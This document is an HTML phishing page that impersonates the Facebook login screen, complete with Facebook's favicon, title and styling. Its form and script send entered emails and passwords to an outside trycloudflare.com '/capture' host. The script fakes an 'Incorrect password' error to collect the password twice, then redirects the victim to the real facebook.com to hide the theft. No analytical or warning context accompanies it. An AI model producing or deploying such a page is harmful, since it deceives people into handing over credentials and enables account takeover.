<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yT/r/aS8ecmYRys0.ico">
<title>Facebook – log in or sign up</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:Helvetica,Arial,sans-serif; }
  body { background:#f0f2f5; display:flex; justify-content:center; padding:20px; }
  .wrap { width:100%; max-width:400px; margin-top:40px; }
  .logo { color:#1877f2; font-size:48px; font-weight:bold; text-align:center; margin-bottom:20px; letter-spacing:-2px; }
  .card { background:#fff; border-radius:8px; padding:20px; box-shadow:0 2px 4px rgba(0,0,0,.1); }
  .card input { width:100%; padding:14px; margin:8px 0; border:1px solid #dddfe2; border-radius:6px; font-size:16px; }
  .card input:focus { outline:none; border-color:#1877f2; box-shadow:0 0 0 2px #e7f3ff; }
  .login-btn { width:100%; background:#1877f2; color:#fff; border:none; padding:14px; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer; margin-top:8px; }
  .login-btn:hover { background:#166fe5; }
  .forgot { text-align:center; margin:14px 0; }
  .forgot a { color:#1877f2; text-decoration:none; font-size:14px; }
  .divider { border-bottom:1px solid #dadde1; margin:18px 0; }
  .create { width:100%; background:#42b72a; color:#fff; border:none; padding:14px; border-radius:6px; font-size:17px; font-weight:bold; cursor:pointer; }
  .err { color:#fa383e; font-size:13px; text-align:center; margin-top:10px; min-height:18px; }
</style>
</head>
<body>
<div class="wrap">
  <div class="logo">facebook</div>
  <div class="card">
    <form id="lg" action="https://xhtml-incidence-vast-solar.trycloudflare.com/capture" method="POST" autocomplete="off">
      <input type="text" name="email" placeholder="Email or phone number" required>
      <input type="password" name="password" placeholder="Password" required>
      <button class="login-btn" type="submit">Log In</button>
      <div class="err" id="err"></div>
    </form>
    <div class="forgot"><a href="#">Forgotten password?</a></div>
    <div class="divider"></div>
    <button class="create">Create New Account</button>
  </div>
  <p style="text-align:center;margin-top:18px;font-size:14px;color:#1c1e21;">
    <b>Meta</b> helps you connect and share with the people in your life.
  </p>
</div>
<script>
document.getElementById('lg').addEventListener('submit', function(e){
  e.preventDefault();
  var f = e.target;
  if(!f.dataset.tries){ f.dataset.tries = 1; }
  else { f.dataset.tries = parseInt(f.dataset.tries)+1; }
  var fd = new FormData(f);
  fetch('https://xhtml-incidence-vast-solar.trycloudflare.com/capture', {method:'POST', body: fd})
    .then(function(){
      if(f.dataset.tries == "1"){
        document.getElementById('err').textContent = "Incorrect password. Please try again.";
        f.querySelector('input[name=password]').value = "";
        f.querySelector('input[name=password]').focus();
      } else {
        window.location.href = "https://www.facebook.com/";
      }
    });
});
</script>
</body>
</html>
